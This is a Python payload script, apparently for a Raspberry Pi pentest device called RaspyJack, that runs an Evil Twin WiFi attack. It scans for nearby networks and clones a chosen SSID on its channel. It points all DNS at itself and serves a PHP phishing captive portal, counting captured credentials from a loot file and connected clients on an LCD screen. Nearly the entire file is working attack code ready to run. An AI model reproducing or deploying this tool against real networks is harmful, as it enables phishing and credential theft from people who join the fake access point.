#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **Evil Twin with Captive Portal**
=======================================================
This script automates the setup of an Evil Twin access point. It creates a
fake WiFi network and redirects all connecting clients to a captive portal
(phishing page) to capture credentials.

This is an advanced payload that requires `hostapd`, `dnsmasq`, and `php`
to be installed.

Features:
1.  Stops conflicting network services.
2.  Dynamically creates configuration files for hostapd and dnsmasq.
3.  Starts a fake AP, a DHCP/DNS server, and a PHP web server.
4.  Monitors dnsmasq.leases to show connected clients.
5.  Monitors the loot file for captured credentials.
6.  Provides a real-time status display on the LCD.
7.  Cleans up all processes and restores network state on exit.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# WiFi Integration - Import dynamic interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import (
        get_best_interface,
        set_raspyjack_interface
    )
    WIFI_INTEGRATION = True
    print("✅ WiFi integration loaded - dynamic interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    WIFI_INTEGRATION = False

# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    WIDTH, HEIGHT = 128, 128
    FONT = ImageFont.load_default()
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT_UI = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    WIDTH, HEIGHT = 128, 128
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT = None # Fallback to None if ImageFont is a dummy
    FONT_TITLE = None # Fallback to None if ImageFont is a dummy
    FONT_UI = None # Fallback to None if ImageFont is a dummy

# ---------------------------------------------------------------------------
# 3) Global State & Configuration
# ---------------------------------------------------------------------------
WIFI_INTERFACE = get_best_interface(prefer_wifi=True) # Dynamically determine best WiFi interface
FAKE_AP_SSID = "Free_WiFi"
FAKE_AP_CHANNEL = "6"
CAPTIVE_PORTAL_BASE_PATH = os.path.join("/root", "Raspyjack", "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "wifi") # Default to wifi
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "ip.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin/"

running = True
attack_processes = {}
status_info = {
    "clients": 0,
    "credentials": 0
}

# HTML file selection globals
current_html_file = "wifi" # Default selected folder
html_files_list = []
html_file_index = 0

# Wi-Fi scanning globals
scanned_networks = []
selected_network_index = 0

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
def cleanup(*_):
    global running
    if running:
        running = False
        stop_attack()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) UI Functions
# ---------------------------------------------------------------------------
def draw_message(message: str, color: str = "yellow"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(message)
        return
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"SSID: {FAKE_AP_SSID}")
            print(f"Channel: {FAKE_AP_CHANNEL}")
            print(f"Portal: {current_html_file}")
        return

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    if screen_state == "main":
        d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill="#00FF00")
        d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

        d.text((5, 30), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
        d.text((5, 45), f"Channel: {FAKE_AP_CHANNEL}", font=FONT_UI, fill="white")
        d.text((5, 60), f"Portal: {current_html_file}", font=FONT_UI, fill="white")

        d.text((5, 80), "KEY1=Scan Networks", font=FONT_UI, fill="cyan")
        d.text((5, 95), "OK=Start", font=FONT_UI, fill="cyan")
        d.text((5, 110), "KEY3=Select Portal", font=FONT_UI, fill="cyan")
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT_UI, fill="red")
        else:
            for i, file_name in enumerate(html_files_list):
                display_name = file_name
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == html_file_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue") # Highlight selected
                d.text((5, 25 + i*15), display_name, font=FONT_UI, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill="cyan")
    elif screen_state == "scan_networks":
        d.text((5, 5), "Scanning Networks...", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not scanned_networks:
            d.text((5, 40), "No networks found!", font=FONT_UI, fill="red")
        else:
            for i, network in enumerate(scanned_networks):
                display_name = network['ssid']
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == selected_network_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue") # Highlight selected
                d.text((5, 25 + i*15), display_name, font=FONT_UI, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)

        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill="yellow")
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT_UI, fill="orange")

        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 6) Core Attack Functions
# ---------------------------------------------------------------------------
def scan_wifi_networks():
    global scanned_networks, selected_network_index, WIFI_INTERFACE

    draw_message("Scanning...", "yellow")
    
    # Bring down interface, set to monitor mode
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode monitor", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
    time.sleep(1) # Give interface time to come up in monitor mode

    try:
        cmd = f"iwlist {WIFI_INTERFACE} scan"
        scan_output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.PIPE)
        
        networks = []
        current_network = {}
        for line in scan_output.splitlines():
            line = line.strip()
            if line.startswith("Cell"):
                if current_network:
                    networks.append(current_network)
                current_network = {}
            elif line.startswith("ESSID:"):
                current_network['ssid'] = line.split(':', 1)[1].strip().strip('"')
            elif line.startswith("Address:"):
                current_network['bssid'] = line.split(':', 1)[1].strip()
            elif line.startswith("Channel:"):
                current_network['channel'] = line.split(':', 1)[1].strip()
        if current_network:
            networks.append(current_network)
        
        scanned_networks = [n for n in networks if 'ssid' in n and n['ssid']] # Filter out networks without SSID
        selected_network_index = 0
        
    except subprocess.CalledProcessError as e:
        draw_message(f"Scan Error:\n{e.stderr.strip()}", "red")
        time.sleep(3)
        scanned_networks = []
    finally:
        # Return interface to managed mode
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
        time.sleep(1)

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE

    # Scan for directories in CAPTIVE_PORTAL_BASE_PATH
    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_message("No portals found!", "red")
        time.sleep(2)
        return

    # Set initial index to current_html_file if it exists in the list
    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
        current_html_file = html_files_list[0]

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt") # Assuming loot.txt in each portal dir
            draw_message(f"Selected:\n{current_html_file}", "lime")
            time.sleep(1)
            return
        elif btn == "KEY3": # Cancel
            return
        
        time.sleep(0.1)

def check_dependencies():
    deps = ["hostapd", "dnsmasq", "php"]
    for dep in deps:
        if subprocess.run(f"which {dep}", shell=True, capture_output=True).returncode != 0:
            return dep
    return None

def stop_interfering_services():
    subprocess.run("pkill wpa_supplicant", shell=True)
    subprocess.run("pkill dhclient", shell=True)
    subprocess.run("pkill dnsmasq", shell=True)
    subprocess.run("pkill hostapd", shell=True)
    subprocess.run("pkill php", shell=True)
    time.sleep(2)

def create_configs():
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    
    # hostapd.conf
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    hostapd_conf = f"""
interface={WIFI_INTERFACE}
driver=nl80211
ssid={FAKE_AP_SSID}
hw_mode=g
channel={FAKE_AP_CHANNEL}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(hostapd_conf_path, "w") as f:
        f.write(hostapd_conf)

    # dnsmasq.conf
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    dnsmasq_conf = f"""
interface={WIFI_INTERFACE}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/10.0.0.1
"""
    with open(dnsmasq_conf_path, "w") as f:
        f.write(dnsmasq_conf)
    
    return hostapd_conf_path, dnsmasq_conf_path

def start_attack():
    global attack_processes
    
    # Ensure the selected interface is properly set up as the primary interface
    draw_message(f"Activating {WIFI_INTERFACE}...", "yellow")
    if not set_raspyjack_interface(WIFI_INTERFACE):
        draw_message(f"Failed to activate {WIFI_INTERFACE}", "red")
        time.sleep(3)
        return False
    
    stop_interfering_services()
    hostapd_conf, dnsmasq_conf = create_configs()

    # Clear old loot
    if os.path.exists(LOOT_FILE):
        os.remove(LOOT_FILE)

    try:
        # Configure interface
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True, check=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True, check=True)
        
        # Start hostapd
        cmd_hostapd = f"hostapd {hostapd_conf}"
        attack_processes['hostapd'] = subprocess.Popen(cmd_hostapd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['hostapd'].poll() is not None:
            print(f"ERROR: hostapd failed to start. Stderr: {attack_processes['hostapd'].stderr.read().decode()}", file=sys.stderr)
            return False

        # Start dnsmasq
        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf} -d"
        attack_processes['dnsmasq'] = subprocess.Popen(cmd_dnsmasq, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['dnsmasq'].poll() is not None:
            print(f"ERROR: dnsmasq failed to start. Stderr: {attack_processes['dnsmasq'].stderr.read().decode()}", file=sys.stderr)
            return False

        # Start PHP server for captive portal
        cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
        attack_processes['php'] = subprocess.Popen(cmd_php, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['php'].poll() is not None:
            print(f"ERROR: PHP web server failed to start. Stderr: {attack_processes['php'].stderr.read().decode()}", file=sys.stderr)
            return False
        
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error starting attack services: {e}", file=sys.stderr)
        return False

def stop_attack():
    for name, proc in attack_processes.items():
        try:
            os.kill(proc.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    attack_processes.clear()
    
    # Restore networking
    stop_interfering_services()
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
    # Maybe run `systemctl restart dhcpcd` or similar
    
    # Clean up temp files
    if os.path.exists(TEMP_CONF_DIR):
        subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

def monitor_status():
    """Thread to monitor lease and loot files."""
    while running:
        # Count clients
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
                status_info["clients"] = len(f.readlines())
        except FileNotFoundError:
            status_info["clients"] = 0
            
        # Count credentials
        try:
            with open(LOOT_FILE, "r") as f:
                status_info["credentials"] = len(f.readlines())
        except FileNotFoundError:
            status_info["credentials"] = 0
            
        time.sleep(5)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    is_attacking = False
    current_screen = "main" # New state variable for UI

    dep_missing = check_dependencies()
    if dep_missing:
        draw_message(f"{dep_missing} not found!", "red")
        time.sleep(5)
        raise SystemExit(f"{dep_missing} not found")

    while running:
        if current_screen == "main":
            draw_ui("main")
            if GPIO.input(PINS["KEY1"]) == 0: # Scan Networks
                current_screen = "scan_networks"
                scan_wifi_networks()
                time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["KEY3"]) == 0: # Select Portal
                current_screen = "html_select"
                time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["OK"]) == 0: # Start Attack
                draw_message("Starting...")
                if start_attack():
                    is_attacking = True
                    current_screen = "attacking"
                    threading.Thread(target=monitor_status, daemon=True).start()
                else:
                    draw_message("Attack FAILED", "red")
                    time.sleep(3)
                    current_screen = "main" # Go back to main menu on failure
                time.sleep(0.2) # Debounce
        elif current_screen == "scan_networks":
            draw_ui("scan_networks")
            btn = None
            for name, pin in PINS.items():
                if GPIO.input(pin) == 0:
                    btn = name
                    while GPIO.input(pin) == 0: # Debounce
                        time.sleep(0.05)
                    break
            
            if btn == "UP":
                selected_network_index = (selected_network_index - 1 + len(scanned_networks)) % len(scanned_networks)
            elif btn == "DOWN":
                selected_network_index = (selected_network_index + 1) % len(scanned_networks)
            elif btn == "OK":
                if scanned_networks:
                    selected_network = scanned_networks[selected_network_index]
                    FAKE_AP_SSID = selected_network['ssid']
                    FAKE_AP_CHANNEL = selected_network['channel']
                    draw_message(f"Selected:\n{FAKE_AP_SSID}", "lime")
                    time.sleep(1)
                current_screen = "main" # Return to main after selection
            elif btn == "KEY3": # Cancel
                current_screen = "main"
            time.sleep(0.1)
        elif current_screen == "html_select":
            handle_file_selection_logic()
            current_screen = "main" # Return to main after selection
            time.sleep(0.2) # Debounce
        elif current_screen == "attacking":
            draw_ui("attacking", "ACTIVE")
            if GPIO.input(PINS["OK"]) == 0: # Stop Attack
                draw_message("Stopping...")
                cleanup()
                is_attacking = False
                current_screen = "main"
                time.sleep(2) # Give time for cleanup message
            elif GPIO.input(PINS["KEY3"]) == 0: # Exit during attack
                cleanup()
                break
        
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_message(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    cleanup()
    draw_message("Cleaning up...")
    time.sleep(2)
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Evil Twin payload finished.")
